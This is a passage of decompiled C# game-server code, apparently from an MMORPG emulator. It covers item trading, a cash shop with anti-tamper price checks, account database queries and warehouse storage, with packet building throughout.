				Buffer.BlockCopy(BitConverter.GetBytes(买卖), 0, array, 14, 1);
				Buffer.BlockCopy(物品ID, 0, array, 18, 4);
				Buffer.BlockCopy(物品数量, 0, array, 26, 4);
				Buffer.BlockCopy(价格, 0, array, 34, 8);
				Buffer.BlockCopy(物品ID, 0, array, 50, 4);
				Buffer.BlockCopy(物品数量, 0, array, 58, 4);
				Buffer.BlockCopy(物品属性, 0, array, 74, World.物品属性大小);
				byte[] array2 = new byte[World.数据库单个物品大小];
				uint num = (uint)BitConverter.ToInt32(物品数量, 0);
				if (num < 1 || !World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out var value))
				{
					return;
				}
				int fLD_SIDE = value.FLD_SIDE;
				if (买卖 == 1)
				{
					if (fLD_SIDE != 0)
					{
						byte[] array3 = new byte[4];
						Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
						物品类 物品类2 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
						if (物品类2 != null)
						{
							位置 = 物品类2.物品位置;
							物品数量 = BitConverter.GetBytes(num + BitConverter.ToInt32(物品类2.物品数量, 0));
						}
					}
					else
					{
						num = 1u;
						物品数量 = BitConverter.GetBytes(1);
					}
					Buffer.BlockCopy(物品全局ID, 0, array, 42, 8);
					Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
					Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
					Buffer.BlockCopy(物品属性, 0, array2, 16, 20);
					Buffer.BlockCopy(物品数量, 0, array2, 12, 4);
					Buffer.BlockCopy(BitConverter.GetBytes((int)num), 0, array, 26, 4);
					Buffer.BlockCopy(物品数量, 0, array, 57, 4);
					装备栏包裹[位置].物品_byte = array2;
				}
				else
				{
					物品类 物品类3 = 装备栏包裹[位置];
					if (BitConverter.ToInt32(物品类3.物品ID, 0) == 0 || BitConverter.ToInt32(物品类3.物品数量, 0) == 0 || BitConverter.ToInt32(物品类3.物品数量, 0) < num || num < 1)
					{
						return;
					}
					if (fLD_SIDE != 0)
					{
						int num2 = BitConverter.ToInt32(物品类3.物品数量, 0) - (int)num;
						if (num2 <= 0)
						{
							装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
							Buffer.BlockCopy(BitConverter.GetBytes((int)num), 0, array, 26, 4);
							Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array, 58, 4);
						}
						else
						{
							Buffer.BlockCopy(物品类3.物品全局ID, 0, array2, 0, 8);
							Buffer.BlockCopy(物品类3.物品ID, 0, array2, 8, 4);
							Buffer.BlockCopy(物品类3.物品属性, 0, array2, 16, World.物品属性大小);
							Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array2, 12, 4);
							Buffer.BlockCopy(物品类3.物品全局ID, 0, array, 42, 8);
							Buffer.BlockCopy(BitConverter.GetBytes((int)num), 0, array, 26, 4);
							Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array, 58, 4);
							装备栏包裹[位置].物品_byte = array2;
						}
					}
					else
					{
						装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
					}
				}
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 68, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "买卖物品 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
			初始化装备篮包裹();
		}

		public void 百宝(byte[] 封包数据, int 封包大小)
		{
			if (元宝合成开关 == 1)
			{
				return;
			}
			if (base.元宝充值 > 0 || base.钻石充值 > 0)
			{
				充值入排行榜();
			}
			byte[] array = new byte[4];
			Buffer.BlockCopy(封包数据, 10, array, 0, 1);
			switch (BitConverter.ToInt32(array, 0))
			{
			case 1:
				if (安全码是否通过验证)
				{
					百宝();
				}
				else
				{
					发送安全码消息(3);
				}
				break;
			case 2:
			{
				byte[] array2 = Converter.hexStringToByte("AA5507007100D50001000255AA");
				if (base.Client != null)
				{
					base.Client.Send(array2, array2.Length);
				}
				break;
			}
			}
		}

		public void 百宝()
		{
			try
			{
				using 发包类 发包类 = new 发包类();
				发包类.Write(1);
				发包类.Write(1);
				发包类.Write2(World.ServerID);
				发包类.Write2(World.服务器组ID);
				发包类.WriteAsciiFixed(World.百宝阁地址);
				发包类.Write2(0);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 54528, 0);
				}
			}
			catch
			{
			}
		}

		public void 查登陆IP()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable("select FLD_LASTLOGINIP, FLD_REGIP, FLD_SAFEWORD from [TBL_ACCOUNT] where FLD_ID=@Userid", new SqlParameter[1] { SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid) }, "rxjhaccount");
			base.lastloginip = dBToDataTable.Rows[0]["FLD_LASTLOGINIP"].ToString();
			base.zastcoginip = dBToDataTable.Rows[0]["FLD_REGIP"].ToString();
			游戏安全码 = dBToDataTable.Rows[0]["FLD_SAFEWORD"].ToString();
			dBToDataTable.Dispose();
		}

		public void CheckTreasureGems()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable("select FLD_SEX, FLD_RXPIONT, FLD_RXPIONTX, FLD_CJCS, FLD_MONEY, FLD_PAY, FLD_INCOME, FLD_VIP, FLD_VIPTIM, FLD_COIN from [TBL_ACCOUNT] where FLD_ID=@Userid", new SqlParameter[1] { SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid) }, "rxjhaccount");
			base.FLD_RXPIONT = (int)dBToDataTable.Rows[0]["FLD_RXPIONT"];
			base.FLD_RXPIONTX = (int)dBToDataTable.Rows[0]["FLD_RXPIONTX"];
			base.FLD_Coin = (int)dBToDataTable.Rows[0]["FLD_COIN"];
			base.FLD_CJCS = (int)dBToDataTable.Rows[0]["FLD_CJCS"];
			base.FLD_首充次数 = (int)dBToDataTable.Rows[0]["FLD_MONEY"];
			base.元宝充值 = (int)dBToDataTable.Rows[0]["FLD_PAY"];
			base.钻石充值 = (int)dBToDataTable.Rows[0]["FLD_INCOME"];
			if (base.FLD_RXPIONT < 0)
			{
				封号(720, base.Userid, "元宝为负数");
			}
			if (base.FLD_RXPIONTX < 0)
			{
				封号(720, base.Userid, "钻石为负数");
			}
			if (base.FLD_Coin < 0)
			{
				base.FLD_Coin = 0;
			}
			if (World.元宝检测 == 1 && base.FLD_RXPIONT >= World.帐号总元宝上限)
			{
				MainForm.WriteLine(77, "玩家元宝总数超出系统允许上限[" + base.Userid + "]-[" + base.UserName + "] [元宝总数：" + base.FLD_RXPIONT + "] [系统允许上限数量：" + World.帐号总元宝上限 + "]");
				switch (World.元宝检测操作)
				{
				case 1:
					base.FLD_RXPIONT = 0;
					SaveGemData();
					break;
				case 2:
					封号(720, base.Userid, "元宝总数超出系统允许数量");
					break;
				}
			}
			dBToDataTable.Dispose();
		}

		public string 百宝阁买卖东西(int id, int sl, int 元宝, int 类型, int FLD_MAGIC0, int FLD_MAGIC1, int FLD_MAGIC2, int FLD_MAGIC3, int FLD_MAGIC4, int 中级魂, int 觉醒, int 进化, int 绑定, int 使用天数)
		{
			try
			{
				if (DateTime.Now.Subtract(使用百宝time).TotalSeconds < 2.0)
				{
					return "百宝阁每1秒可使用一回";
				}
				使用百宝time = DateTime.Now;
				new Random(World.GetRandomSeed());
				if (World.百宝阁属性物品类list.TryGetValue(id, out var value))
				{
					if (value.PID != id)
					{
						MainForm.WriteLine(77, "非法修改封包封号5_百宝阁买卖东西[" + base.Userid + "][" + base.UserName + "] 人物全服ID=[" + base.人物全服ID + "] [" + base.Client.ToString() + "]");
						if (base.Client != null)
						{
							base.Client.Dispose();
						}
						return "你已经被封号请联系管理";
					}
					if (value.TYPE != 类型)
					{
						MainForm.WriteLine(77, "非法修改封包封号3_百宝阁买卖东西[" + base.Userid + "][" + base.UserName + "] 人物全服ID=[" + base.人物全服ID + "] [" + base.Client.ToString() + "]");
						if (base.Client != null)
						{
							base.Client.Dispose();
						}
						return "你已经被封号请联系管理";
					}
					if ((long)元宝 > 0L && sl <= 10 && sl > 0 && id != 0)
					{
						if (sl == 1)
						{
							if (元宝 != value.PRICE)
							{
								MainForm.WriteLine(77, "非法修改封包封号2_百宝阁买卖东西[" + base.Userid + "][" + base.UserName + "] 人物全服ID=[" + base.人物全服ID + "] [" + base.Client.ToString() + "]");
								if (base.Client != null)
								{
									base.Client.Dispose();
								}
								return "购买错误";
							}
						}
						else if (元宝 != value.PRICE * sl)
						{
							MainForm.WriteLine(77, "非法修改封包封号3_百宝阁买卖东西[" + base.Userid + "][" + base.UserName + "] 人物全服ID=[" + base.人物全服ID + "] [" + base.Client.ToString() + "]");
							if (base.Client != null)
							{
								base.Client.Dispose();
							}
							return "购买错误";
						}
						int num = 得到包裹空位(this);
						int num2 = id;
						if (num == -1)
						{
							return "没有空位了";
						}
						CheckTreasureGems();
						if (类型 != 4)
						{
							if ((long)元宝 <= 0L)
							{
								return "元宝不够了";
							}
							if (base.FLD_RXPIONT < 元宝)
							{
								return "元宝不够了";
							}
							检察元宝数据(元宝, 0, "百宝");
							if (World.元宝送积分是否开启 == 1)
							{
								CheckGemPointsData(元宝, 1, "百宝");
								钻石消费数据(元宝, 1);
							}
							if (World.百宝消费榜是否开启 == 1)
							{
								DataTable dataTable = RxjhClass.得到武林荣誉数据(base.UserName, base.人物分区ID);
								if (dataTable != null)
								{
									int num3 = (int)dataTable.Rows[0]["FLD_RY"];
									RxjhClass.更新武林荣誉(base.UserName, base.帮派名字, base.Player_Zx, base.Player_Level, base.Player_Job, base.Player_Job_leve, num3 + 元宝, base.人物分区ID);
									dataTable.Dispose();
								}
								else
								{
									RxjhClass.创建武林荣誉(base.UserName, base.帮派名字, base.Player_Zx, base.Player_Level, base.Player_Job, base.Player_Job_leve, 元宝, base.人物分区ID);
								}
							}
						}
						else
						{
							if (base.FLD_RXPIONTX < 元宝)
							{
								return "积分不够了";
							}
							CheckGemPointsData(元宝, 0, "百宝");
						}
						switch (num2)
						{
						case 800000012:
							FLD_MAGIC0 = RNG.Next(200002, 200010);
							break;
						case 800000011:
							FLD_MAGIC0 = RNG.Next(100002, 100010);
							break;
						case 800000046:
							FLD_MAGIC0 = RNG.Next(1, 22);
							break;
						case 800000047:
							FLD_MAGIC0 = RNG.Next(23, 51);
							break;
						case 800000048:
							FLD_MAGIC0 = RNG.Next(70, 81);
							break;
						case 800000025:
							FLD_MAGIC0 = RNG.Next(1000002, 1000010);
							break;
						case 800000026:
							FLD_MAGIC0 = RNG.Next(700002, 700010);
							break;
						case 800000027:
							FLD_MAGIC0 = int.Parse("200" + RNG.Next(0, 6) + "000");
							break;
						}
						if (sl > 1)
						{
							AddItemWithProperties(id, num, 1, FLD_MAGIC0, FLD_MAGIC1, FLD_MAGIC2, FLD_MAGIC3, FLD_MAGIC4, 觉醒, 中级魂, 进化, 绑定, 使用天数);
							for (int i = 1; i < sl; i++)
							{
								num = 得到包裹空位(this);
								switch (num2)
								{
								case 800000012:
									FLD_MAGIC0 = RNG.Next(200002, 200010);
									break;
								case 800000011:
									FLD_MAGIC0 = RNG.Next(100002, 100010);
									break;
								case 800000046:
									FLD_MAGIC0 = RNG.Next(1, 22);
									break;
								case 800000047:
									FLD_MAGIC0 = RNG.Next(23, 51);
									break;
								case 800000048:
									FLD_MAGIC0 = RNG.Next(70, 81);
									break;
								case 800000025:
									FLD_MAGIC0 = RNG.Next(1000002, 1000010);
									break;
								case 800000026:
									FLD_MAGIC0 = RNG.Next(700002, 700010);
									break;
								case 800000027:
									FLD_MAGIC0 = int.Parse("200" + RNG.Next(0, 6) + "000");
									break;
								}
								AddItemWithProperties(id, num, 1, FLD_MAGIC0, FLD_MAGIC1, FLD_MAGIC2, FLD_MAGIC3, FLD_MAGIC4, 觉醒, 中级魂, 进化, 绑定, 使用天数);
							}
						}
						else
						{
							AddItemWithProperties(id, num, 1, FLD_MAGIC0, FLD_MAGIC1, FLD_MAGIC2, FLD_MAGIC3, FLD_MAGIC4, 觉醒, 中级魂, 进化, 绑定, 使用天数);
						}
						RxjhClass.百宝记录(base.Userid, base.UserName, id, id.ToString(), sl, 元宝);
						SaveGemData();
						return "购买成功";
					}
					MainForm.WriteLine(77, "非法修改封包封号1_百宝阁买卖东西[" + base.Userid + "][" + base.UserName + "] 人物全服ID=[" + base.人物全服ID + "] [" + base.Client.ToString() + "]");
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
					return "购买错误";
				}
				MainForm.WriteLine(77, "非法修改封包封号3_百宝阁买卖东西[" + base.Userid + "][" + base.UserName + "] 人物全服ID=[" + base.人物全服ID + "] [" + base.Client.ToString() + "]");
				if (base.Client != null)
				{
					base.Client.Dispose();
				}
				return "购买错误";
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "百宝阁买卖东西 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
				return "购买错误";
			}
		}

		public int 得到个人仓库空位(int iii)
		{
			for (int i = 0; i < 60; i++)
			{
				if (iii == 3)
				{
					if (BitConverter.ToInt32(个人仓库[i].物品ID, 0) == 0)
					{
						return i;
					}
				}
				else if (BitConverter.ToInt32(公共仓库[i].物品ID, 0) == 0)
				{
					return i;
				}
			}
			return -1;
		}

		public int 得到灵兽窝空位(int ID)
		{
			int num = 0;
			while (true)
			{
				if (num < 2)
				{
					if (BitConverter.ToInt32(灵兽仓库[num].物品ID, 0) == 0)
					{
						break;
					}
					num++;
					continue;
				}
				return -1;
			}
			return num;
		}

		public int 得到灵宠窝空位(int ID)
		{
			int num = 0;
			while (true)
			{
				if (num < 20)
				{
					if (BitConverter.ToInt32(灵宠仓库[num].物品ID, 0) == 0)
					{
						break;
					}
					num++;
					continue;
				}
				return -1;
			}
			return num;
		}

		public bool 检测非法叠加物品(Players players_0, int int_75, int int_76)
		{
			if (!World.Itme.TryGetValue(int_76, out var _))
			{
				return true;
			}
			int num = 0;
			while (true)
			{
				if (num < 96)
				{
					if (BitConverter.ToInt32(players_0.装备栏包裹[num].物品ID, 0) == int_76 && (BitConverter.ToInt32(players_0.装备栏包裹[num].物品数量, 0) + int_75 > 9999 || BitConverter.ToInt32(players_0.装备栏包裹[num].物品数量, 0) + int_75 <= 0))
					{
						break;
					}
					num++;
					continue;
				}
				return false;
			}
			return true;
		}

		public void 仓库存取(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				if (交易 != null && 交易.交易中)
				{
					return;
				}
				int num;
				int num8;
				int num9;
				int num10;
				long num11;
				if (!打开仓库中)
				{
					MainForm.WriteLine(6, "仓库存取 BUG![" + base.Userid + "]-[" + base.UserName + "]");
				}
				else if (!进店中 && !退出中 && !base.Player死亡)
				{
					byte[] array = new byte[4];
					byte[] dst = new byte[8];
					byte[] array2 = new byte[8];
					byte[] array3 = new byte[4];
					byte[] array4 = new byte[4];
					num = 100;
					byte[] array5 = new byte[2];
					Buffer.BlockCopy(封包数据, 8, array5, 0, 2);
					if (BitConverter.ToInt16(array5, 0) <= 108)
					{
						Buffer.BlockCopy(封包数据, 10, array4, 0, 2);
						Buffer.BlockCopy(封包数据, 18, array, 0, 4);
						Buffer.BlockCopy(封包数据, 22, array2, 0, 8);
						Buffer.BlockCopy(封包数据, 34, dst, 0, 8);
						Buffer.BlockCopy(封包数据, 55, array3, 0, 1);
					}
					else
					{
						Buffer.BlockCopy(封包数据, 14, array4, 0, 2);
						Buffer.BlockCopy(封包数据, 22, array, 0, 4);
						Buffer.BlockCopy(封包数据, 30, array2, 0, 8);
						Buffer.BlockCopy(封包数据, 46, dst, 0, 8);
						Buffer.BlockCopy(封包数据, 72, array3, 0, 1);
					}
					num8 = BitConverter.ToInt32(array4, 0);
					num9 = BitConverter.ToInt32(array, 0);
					num10 = BitConverter.ToInt32(array3, 0);
					num11 = BitConverter.ToInt64(array2, 0);
					if (num11 < 1)
					{
						MainForm.WriteLine(5, "非法复制_仓库存取[" + base.Userid + "]-[" + base.UserName + "]___[" + num8 + "]___[" + num9 + "]___[" + num10 + "]___[" + num11 + "]");
						goto IL_0311;
					}
					if ((uint)(num8 - 5) > 1u)
					{
						goto IL_031e;
					}
					num = ((base.人物善恶 <= -1 && base.人物善恶 > -500) ? (num + num * 2) : ((base.人物善恶 <= -500 && base.人物善恶 > -5000) ? (num + num * 4) : ((base.人物善恶 <= -5000 && base.人物善恶 > -10000) ? (num * 8) : ((base.人物善恶 > -10000 || base.人物善恶 <= -30000) ? num : (num * 16)))));
					if (base.Player_Money >= num)
					{
						base.Player_Money -= num;
						更新金钱和负重();
						goto IL_031e;
					}
					购买物品提示(13);
				}
				goto end_IL_0001;
				IL_031e:
				switch (num8)
				{
				case 3:
				{
					int num5 = 得到个人仓库空位(3);
					if (num5 != -1)
					{
						仓库_装备栏减物品(num9, num10, num11, num5, 3);
					}
					else
					{
						购买物品提示(14);
					}
					break;
				}
				case 4:
					if (装备栏包裹[num10].物品绑定)
					{
						byte[] array6 = Converter.hexStringToByte("AA5556000A0093004800040000000A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000077A755AA");
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array6, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array6, array6.Length);
						}
					}
					else
					{
						int num3 = 得到个人仓库空位(4);
						if (num3 != -1)
						{
							仓库_装备栏减物品(num9, num10, num11, num3, 4);
						}
						else
						{
							购买物品提示(14);
						}
					}
					break;
				case 5:
				{
					int num13 = 得到包裹空位(this);
					if (num13 != -1)
					{
						仓库_装备栏加物品(num9, num10, num11, num13, 5, num);
						打开个人仓库();
					}
					else
					{
						购买物品提示(14);
					}
					break;
				}
				case 6:
				{
					int num4 = 得到包裹空位(this);
					if (num4 != -1)
					{
						仓库_装备栏加物品(num9, num10, num11, num4, 6, num);
						打开综合仓库();
					}
					else
					{
						购买物品提示(14);
					}
					break;
				}
				case 7:
				{
					int num15;
					if (!检测非法叠加物品(this, (int)num11, (int)装备栏包裹[num10].Get物品ID))
					{
						switch (num9)
						{
						default:
							num15 = ((num9 == 1008001377) ? 1 : 0);
							break;
						case 1000000065:
						case 1000000066:
						case 1000000067:
						case 1000000068:
						case 1000000083:
						case 1000000084:
						case 1000000085:
						case 1000000086:
						case 1000001011:
						case 1000001377:
						case 1000001378:
						case 1000001379:
						case 1000001380:
						case 1000001381:
						case 1000001382:
						case 1000001383:
						case 1000001384:
						case 1000001385:
						case 1000002001:
						case 1000002002:
						case 1000002003:
						case 1000002004:
						case 1000002005:
						case 1000002006:
						case 1008000557:
						case 1008000558:
							num15 = 1;
							break;
						}
					}
					else
					{
						num15 = 0;
					}
					if (num15 != 0)
					{
						int num2 = 得到灵兽窝空位(0);
						if (num2 != -1)
						{
							仓库_装备栏减物品(num9, num10, num11, num2, 7);
						}
						else
						{
							购买物品提示(14);
						}
					}
					break;
				}
				case 8:
					if ((!检测非法叠加物品(this, (int)num11, (int)灵兽仓库[num10].Get物品ID)) ? true : false)
					{
						int num14 = 得到包裹空位(this);
						if (num14 != -1)
						{
							仓库_装备栏加物品(num9, num10, num11, num14, 8, num);
						}
						else
						{
							购买物品提示(14);
						}
					}
					break;
				case 9:
				{
					int num6;
					if (!检测非法叠加物品(this, (int)num11, (int)装备栏包裹[num10].Get物品ID))
					{
						switch (num9)
						{
						default:
							num6 = ((num9 == 1000001151) ? 1 : 0);
							break;
						case 1000001170:
						case 1000001171:
						case 1000001172:
						case 1000001173:
						case 1000001174:
						case 1000001175:
						case 1000001182:
						case 1000001183:
						case 1000001184:
						case 1000001185:
						case 1000001186:
						case 1000001187:
						case 1000001188:
						case 1000001250:
						case 1000001251:
						case 1000001276:
						case 1000001301:
						case 1000001302:
						case 1000001303:
						case 1000001304:
							num6 = 1;
							break;
						}
					}
					else
					{
						num6 = 0;
					}
					if (num6 != 0)
					{
						int num7 = 得到灵宠窝空位(0);
						if (num7 != -1)
						{
							仓库_装备栏减物品(num9, num10, num11, num7, 9);
						}
						else
						{
							购买物品提示(14);
						}
					}
					break;
				}
				case 10:
					if ((!检测非法叠加物品(this, (int)num11, (int)灵宠仓库[num10].Get物品ID)) ? true : false)
					{
						int num12 = 得到包裹空位(this);
						if (num12 != -1)
						{
							仓库_装备栏加物品(num9, num10, num11, num12, 10, num);
						}
						else
						{
							购买物品提示(14);
						}
					}
					break;
				}
				goto IL_0311;
				IL_0311:
				SavePlayerData();
				end_IL_0001:;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "仓库存取 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 仓库_装备栏加减钱数(int 物品ID, long 数量, int cklx, int 仓库类型)
		{
			byte[] array = Converter.hexStringToByte("AA558600560395007800030000000300000000943577000000006E00000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000E76C55AA");
			Buffer.BlockCopy(BitConverter.GetBytes(仓库类型), 0, array, 10, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(仓库类型), 0, array, 14, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 26, 8);
			Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array, 18, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array, 50, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 仓库包物品操作(int 包ID, int 操作类型, int 物品ID, long 物品数量, 物品类 物品, int 位置, int 费用)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(操作类型);
			发包类.Write4(操作类型);
			发包类.Write8(物品ID);
			发包类.Write8(物品数量);
			发包类.Write8(费用);
			发包类.Write(物品.Get物品全局ID);
			发包类.Write(物品.Get物品ID);
			发包类.Write8(物品.Get物品数量);
			发包类.Write(1);
			发包类.Write(0);
			发包类.Write(位置);
			发包类.Write(0);
			发包类.Write(0);
			发包类.Write(8);
			发包类.Write2(110);
			发包类.Write4(物品.FLD_MAGIC0);
			发包类.Write4(物品.FLD_MAGIC1);
			发包类.Write4(物品.FLD_MAGIC2);
			发包类.Write4(物品.FLD_MAGIC3);
			发包类.Write4(物品.FLD_MAGIC4);
			发包类.Write2(物品.FLD_FJ_MAGIC0);
			发包类.Write2(物品.FLD_FJ_MAGIC1);
			发包类.Write2(物品.FLD_FJ_中级附魂);
			发包类.Write2(物品.FLD_FJ_MAGIC2);
			发包类.Write2(物品.FLD_FJ_MAGIC3);
			发包类.Write2(物品.FLD_FJ_MAGIC4);
			发包类.Write2(物品.FLD_FJ_MAGIC5);
			发包类.Write2(0);
			发包类.Write4(物品.FLD_KSSJ);
			发包类.Write4(物品.FLD_JSSJ);
			发包类.Write2(物品.FLD_FJ_NJ);
			发包类.Write4(物品.FLD_FJ_觉醒);
			发包类.Write2(0);
			发包类.Write2(物品.FLD_FJ_进化);
			发包类.Write2(0);
			发包类.Write4(物品.FLD_FJ_四神之力);
			发包类.Write4(0);
			发包类.Write4(0);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 包ID, base.人物全服ID);
			}
		}

		public void 仓库_装备栏加物品(int 物品ID, int 位置, long 数量, int 包位置, int 仓库类型, int 费用)
		{
			int num = 0;
			int num2 = 0;
			try
			{
				if (物品ID == 2000000000)
				{
					if (base.Player_Money + 数量 > 9999999900L)
					{
						return;
					}
					if (仓库类型 == 5)
					{
						if (base.个人仓库钱数 < 数量)
						{
							MainForm.WriteLine(6, "非法复制_仓库存取_取仓库1[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "]___[" + 物品ID + "]___[" + 位置 + "]___[" + 数量 + "]");
							return;
						}
						base.Player_Money += 数量;
						base.个人仓库钱数 -= 数量;
						仓库_装备栏加减钱数(物品ID, base.个人仓库钱数, 149, 仓库类型);
					}
					else
					{
						if (base.综合仓库钱数 < 数量)
						{
							MainForm.WriteLine(6, "非法复制_仓库存取_取仓库2[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "]___[" + 物品ID + "]___[" + 位置 + "]___[" + 数量 + "]");
							return;
						}
						base.Player_Money += 数量;
						base.综合仓库钱数 -= 数量;
						仓库_装备栏加减钱数(物品ID, base.综合仓库钱数, 149, 仓库类型);
					}
				}
				else
				{
					if (数量 < 1 || 数量 > 9999)
					{
						return;
					}
					物品类 物品类2;
					switch (仓库类型)
					{
					case 8:
					{
						物品类2 = 灵兽仓库[位置];
						for (int l = 0; l < 2; l++)
						{
							if (BitConverter.ToInt32(灵兽仓库[l].物品数量, 0) > 0 || BitConverter.ToInt32(灵兽仓库[l].物品ID, 0) != 0)
							{
								num++;
							}
						}
						break;
					}
					case 10:
					{
						物品类2 = 灵宠仓库[位置];
						for (int j = 0; j < 20; j++)
						{
							if (BitConverter.ToInt32(灵宠仓库[j].物品数量, 0) > 0 || BitConverter.ToInt32(灵宠仓库[j].物品ID, 0) != 0)
							{
								num++;
							}
						}
						break;
					}
					case 5:
					{
						物品类2 = 个人仓库[位置];
						for (int k = 0; k < 60; k++)
						{
							if (BitConverter.ToInt32(个人仓库[k].物品数量, 0) > 0 || BitConverter.ToInt32(个人仓库[k].物品ID, 0) != 0)
							{
								num++;
							}
						}
						break;
					}
					default:
					{
						物品类2 = 公共仓库[位置];
						for (int i = 0; i < 60; i++)
						{
							if (BitConverter.ToInt32(公共仓库[i].物品数量, 0) > 0 || BitConverter.ToInt32(公共仓库[i].物品ID, 0) != 0)
							{
								num++;
							}
						}
						break;
					}
					}
					for (int m = 0; m < 96; m++)
					{
						if (BitConverter.ToInt32(装备栏包裹[m].物品数量, 0) > 0 || BitConverter.ToInt32(装备栏包裹[m].物品ID, 0) != 0)
						{
							num2++;
						}
					}
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品类2.物品ID, 0), out var value) && !物品类2.物品绑定)
					{
						return;
					}
					int fLD_SIDE = value.FLD_SIDE;
					if (fLD_SIDE == 0 && 数量 > 1)
					{
						MainForm.WriteLine(6, "非法复制_仓库存取_取仓库3[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "] 物品名称[" + 物品类2.得到物品名称() + "] 物品数量[" + BitConverter.ToInt32(物品类2.物品数量, 0) + "] 数量[" + 数量 + "]");
						switch (仓库类型)
						{
						case 8:
							灵兽仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						case 10:
							灵宠仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						case 5:
							个人仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						default:
							公共仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						}
						return;
					}
					if (BitConverter.ToInt32(物品类2.物品数量, 0) < 数量)
					{
						switch (仓库类型)
						{
						case 8:
							灵兽仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						case 10:
							灵宠仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						case 5:
							个人仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						default:
							公共仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						}
						MainForm.WriteLine(6, "非法复制_仓库存取_取仓库4[" + base.Userid + "]-[" + base.UserName + "]___[" + 仓库类型 + "] 物品名称[" + 物品类2.得到物品名称() + "] 物品数量[" + BitConverter.ToInt32(物品类2.物品数量, 0) + "] 数量[" + 数量 + "]");
						return;
					}
					if (fLD_SIDE == 0)
					{
						数量 = 1L;
						if (BitConverter.ToInt32(物品类2.物品数量, 0) != 数量)
						{
							return;
						}
						if (物品类2.物品总重量 + base.人物当前负重 >= base.总负重)
						{
							购买物品提示(11);
							return;
						}
						if (物品ID != 物品类2.Get物品ID && !物品类2.物品绑定)
						{
							return;
						}
						base.人物当前负重 += 物品类2.物品总重量;
						byte[] array = new byte[World.数据库单个物品大小];
						byte[] array2 = new byte[8];
						byte[] 物品全局ID = 物品类2.物品全局ID;
						Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 12, 4);
						byte[] dst = array;
						Buffer.BlockCopy(物品全局ID, 0, dst, 0, 8);
						Buffer.BlockCopy(物品类2.物品ID, 0, array, 8, 4);
						Buffer.BlockCopy(物品类2.物品属性, 0, array, 16, World.物品属性大小);
						Buffer.BlockCopy(物品类2.物品_byte, 72, array, 72, 1);
						装备栏包裹[包位置].物品_byte = array;
						仓库包物品操作(37632, 仓库类型, 物品ID, 数量, 装备栏包裹[包位置], 包位置, 费用);
						switch (仓库类型)
						{
						case 8:
							if (灵兽仓库[位置].物品绑定)
							{
								物品ID -= 20000;
							}
							仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 灵兽仓库[位置], 位置, 费用);
							灵兽仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						case 10:
							if (灵宠仓库[位置].物品绑定)
							{
								物品ID -= 20000;
							}
							仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 灵宠仓库[位置], 位置, 费用);
							灵宠仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						case 5:
							if (个人仓库[位置].物品绑定)
							{
								物品ID -= 20000;
							}
							仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 个人仓库[位置], 位置, 费用);
							个人仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						default:
							仓库包物品操作(38144, 仓库类型, 物品ID, 0L, 公共仓库[位置], 位置, 费用);
							公共仓库[位置].物品_byte = new byte[World.数据库单个物品大小];
							break;
						}
					}
